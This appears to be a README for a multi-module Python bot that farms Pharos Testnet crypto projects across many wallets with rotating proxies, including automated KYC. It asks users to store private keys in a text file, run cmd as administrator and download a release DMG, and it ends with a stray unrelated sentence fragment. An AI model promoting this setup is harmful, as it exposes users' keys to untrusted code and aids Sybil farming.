# ⚙️ Pharos Automation BOT (Multi-Module)

A one-stop automation suite for the **Pharos Testnet** ecosystem. Run everything - **Pharos, Gotchipus, OpenFi, Brokex, Faroswap, AquaFlux, Zenith Swap, Pharos Name Service, Grandline, R2 Pharos, Bitverse, AutoStaking, Spout Finance, and Primuslabs Send** - using just **one wallet, proxy, and config**.

> 🔑 Unified Wallet | 🌍 Proxy Rotation | 🧩 Multi-Module Scripts | 📁 All-in-One Repo

---

## 📦 Included Bots

| File Name   | Bot Name                  | Description                                   |
| ----------- | ------------------------- | --------------------------------------------- |
| `bot1.py`   | Pharos BOT                | DeFi automation for Pharos Testnet            |
| `bot2.py`   | Gotchipus BOT             | NFT minting & wearable claiming               |
| `bot3.py`   | OpenFi BOT                | Lending, borrowing & DeFi services            |
| `bot4.py`   | Brokex BOT                | Faucet claim and trade automation             |
| `bot5.py`   | FaroSwap BOT              | Swap and liquidity automation                 |
| `bot6.py`   | AquaFlux BOT              | Auto Mint Standard & Premium NFT              |
| `bot7.py`   | Zenith Swap BOT           | Swap and liquidity automation                 |
| `bot8.py`   | Pharos Name Service BOT   | Auto Mint Random .phrs Domain                 |
| `bot9.py`   | Grandline BOT             | Auto Claim All Available Badge                |
| `bot10.py`  | R2 Pharos BOT             | Swap and liquidity automation                 |
| `bot11.py`  | Bitverse BOT              | Auto trade, deposit, withdraw                 |
| `bot12.py`  | AutoStaking BOT           | Automated staking operations & faucet claims  |
| `bot13.py`  | Spout Finance BOT         | KYC, random trades, and account automation    |
| `bot14.py`  | Primuslabs Send BOT       | Auto send tips via X Handler (social tipping) |

---

## 🧠 Features

✅ Use one wallet + proxy across all bots  
✅ Modular system - run individually or in sequence  
✅ Covers check-ins, faucets, swaps, NFTs, lending, staking, tips, and more  
✅ Three proxy modes: Free public, Private, or No Proxy  
✅ Auto-rotation for invalid proxies  
✅ Multi-account ready for testnet farming  
✅ NEW: Social Tip Automation via X Handler (Primuslabs Send BOT) 

---

## 🔧 Requirements

* Python `3.9+`
* `pip` or `pip3` for dependency installs
* Libraries: `web3`, `eth-account`, `requests`, `colorama`

---

## 🚀 Quick Start Guide
> ⚠️ **Important for Windows users:** If you have Python 3.13+ or encounter compilation errors when installing dependencies (especially `aiohttp`), you'll need **Microsoft C++ Build Tools** (~2-3 GB). 
> 1. Download **Build Tools for Visual Studio 2022**:
>    - Go to: https://visualstudio.microsoft.com/visual-cpp-build-tools/
>    - Click "Download Build Tools"
> 
> 2. Run the installer (`vs_BuildTools.exe`)
> 
> 3. In the Visual Studio Installer window:
>    - Select **"Desktop development with C++"** workload
> 4. Click **Install** (will take 15-30 minutes)
> 
> 5. continue reading the instructions
The guide below supports Windows and Linux; macOS users get the [DMG file](../../releases).  





Step 1: Confirm Git and Python are installed on Windows.



Install Git for Windows:

https://git-scm.com/install/windows



Install Python for Windows:

https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe



Step 2: Start cmd as an administrator.





```bash 
git clone https://github.com/versiaever/Pharos-Testnet-Bot.git
```
```bash 
cd Pharos-Testnet-Bot
```
```bash 
py -m pip install -r requirements.txt
```

 **Add Your Keys & Proxies**

`accounts.txt`:
```
your_private_key_1
your_private_key_2
```

`proxy.txt` (multiple formats supported):
```
127.0.0.1:8080
http://user:pass@127.0.0.1:8080
socks5://127.0.0.1:1080
```

4. **Special Configurations**
- For Faroswap BOT: Update `pools.json` with pool addresses
- For Primuslabs BOT: No additional config needed

5. **Run Bots**
```bash
py bot1.py   # Pharos
```
```bash
py bot2.py   # Gotchipus
```
```bash
py bot3.py   # OpenFi
```
```bash
py bot4.py   # Brokex
```
```bash
py bot5.py   # Faroswap
```
```bash
py bot6.py   # AquaFlux
```
```bash
py bot7.py   # Zenith Swap
```
```bash
py bot8.py   # Pharos Name Service
```
```bash
py bot9.py   # Grandline
```
```bash
py bot10.py  # R2 Pharos
```
```bash
py bot11.py  # Bitverse
```
```bash
py bot12.py  # AutoStaking
```
```bash
py bot13.py  # Spout Finance
```
```bash
py bot14.py  # Primuslabs Send
```

---

## 🤖 Bot Breakdown

### `bot1.py` — **Pharos Testnet BOT**
🔗 [Pharos Testnet](https://testnet.pharosnetwork.xyz/experience?inviteCode=8G8MJ3zGE5B7tJgP)  
✅ Daily check-ins  
✅ Faucet claims  
✅ Token swaps  
✅ LP management  

### `bot2.py` — **Gotchipus BOT**
🔗 [Gotchipus](https://gotchipus.com/)  
✅ NFT minting   
✅ Wearable claims  
✅ Daily check-ins  

### `bot3.py` — **OpenFi BOT**
🔗 [OpenFi](https://app.open-fi.xyz/)  
✅ Lending/borrowing  
✅ Faucet mint  
✅ Auto repay       

### `bot4.py` — **Brokex BOT**
🔗 [Brokex](https://app.brokex.trade/)  
✅ USDT faucet   
✅ Auto trades   
✅ Liquidity management    

### `bot5.py` — **Faroswap BOT**
🔗 [Faroswap](https://faroswap.xyz/swap)  
✅ PHRS wrapping   
✅ Swaps   
✅ Liquidity pools    

### `bot6.py` — **AquaFlux BOT** (NEW)
🔗 [AquaFlux](https://playground.aquaflux.pro/)  
✅ Auto Mint Standard NFT    
✅ Auto Mint Premium NFT (need bind twitter)        
✅ Multi-account support  

### `bot7.py` — Zenith Swap BOT
🔗 [Zenith Swap](https://testnet.zenithswap.xyz/home)  
✅ Auto Wrap PHRS to WPHRS  
✅ Auto Unwrap WPHRS to PHRS  
✅ Random Swap TX  
✅ Add Liquidity  
✅ Multi-account support  

### `bot8.py` — Pharos Name Service BOT
🔗 [Pharos Name Service](https://test.pharosname.com/)  
✅ Auto Mint Random .phrs Domain  
✅ Multi-account support  

### `bot9.py` — Grandline BOT
🔗 [Grandline](https://app.grandline.world/)  
✅ Auto Claim All Available Badges  
✅ Multi-account support  

### `bot10.py` — R2 Pharos BOT
🔗 [R2 Pharos](https://www.r2.money/)  
✅ Auto Make R2 Swap TX  
✅ Auto Make R2 Earn TX  
✅ Multi-account support    

### `bot11.py` — Bitverse  BOT
🔗 [Bitverse](https://testnet.bitverse.zone/app/)  
✅ Auto Deposit USDT
✅Auto Withdraw USDT
✅Auto Make Random Trade 
✅ Multi-account support 

### `bot12.py` — **AutoStaking BOT**
🔗 [Auto Staking](https://autostaking.pro/?env=pharos)  
✅ Automated account info retrieval  
✅ MockUSD faucet claims  
✅ Automated staking transactions  
✅ Proxy rotation support  
✅ Multi-account ready  

### `bot13.py` — **Spout Finance BOT**
🔗 [Spout Finance](https://www.spout.finance/app/trade)  
✅ Auto account info retrieval  
✅ Run with or without proxy  
✅ Auto complete KYC  
✅ Auto random trades  
✅ Multi-account ready  

### `bot14.py` — **Primuslabs Send BOT**  
🔗 [Primuslabs Send](https://pay.primuslabs.xyz/send)  
✅ Auto account info retrieval  
✅ Proxy options: Free, Private, or None  
✅ Smart proxy rotation  
✅ **Auto Send Tip via X Handler (Social Tipping)**  
✅ Multi-account ready  
 
---

## ⚠️ Dependency Notes
Ensure version compatibility:
```bash
pip uninstall web3 eth-account
pip install web3==6.15.0 eth-account==0.11.0
```

---

## ☕ Support the Developers
**EVM:** `0x3b94Ff1611773171E06047C0041099CccCFC609F`   

---

## 🔒 Security & Disclaimer
> ⚠️ **For Testnet Use Only**  
> 🔥 Use burner wallets • 🔐 Never share private keys  
> 🛡️ Review code • ⚖️ No developer liability  

---

## 🙌 Grow With Us
⭐ Star repo • 💬 Share with hunters • 💡 Suggest features  
**Crafted with ❤️ by [CryptoDai3](https://t.me/cryptodai3) × [YetiDAO](https://t.me/YetiDAO)**  
**MIT Licensed • Free to use and modify**
nd the social tip feature is highlighted as a key capability of the new bot.